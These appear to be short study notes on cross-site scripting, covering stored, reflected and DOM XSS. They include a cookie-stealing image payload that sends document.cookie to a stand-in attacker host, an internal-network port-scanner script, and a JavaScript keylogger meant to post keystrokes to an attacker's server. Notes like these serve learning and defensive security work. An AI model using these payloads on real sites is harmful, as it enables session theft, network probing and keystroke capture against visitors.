# Cross-site Scripting (XSS)

## Stored XSS

In essence - this is where malicious strings are stored in a database that will be served to a user at some point. 

* Stored XSS --> Where do we store? --> database

### Quick and dirty method to steal a visitor's cookies:

`<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />`

## Reflected XSS

* Malicious payload is in the **request** to the website. **RE**flected == **RE**quest.
* Most common XSS attack.

## DOM XSS

Malicious payload excecuted *after* page javascript is executed either via page load or page interaction.

* Things to look for: attaching onto tags and injecting your own javascript instead to something like `onmouseover=<maliciousScript>`. 

## XSS Port Scanner

### Sample code
This scanner script looks for web servers (favicon.ico) internally. 

```javascript
 <script>
 for (let i = 0; i < 256; i++) { // This is looping from 0 to 255
  let ip = '192.168.0.' + i // Creates variable for forming IP
  // Creating an image element, if the resource can load, it logs to the /logs page.
  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code // This is adding the image element to the webpage
 }
</script> 
```

## XSS Keylogger

### Sample code
```javascript
 <script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
```

{%hackmd theme-dark %}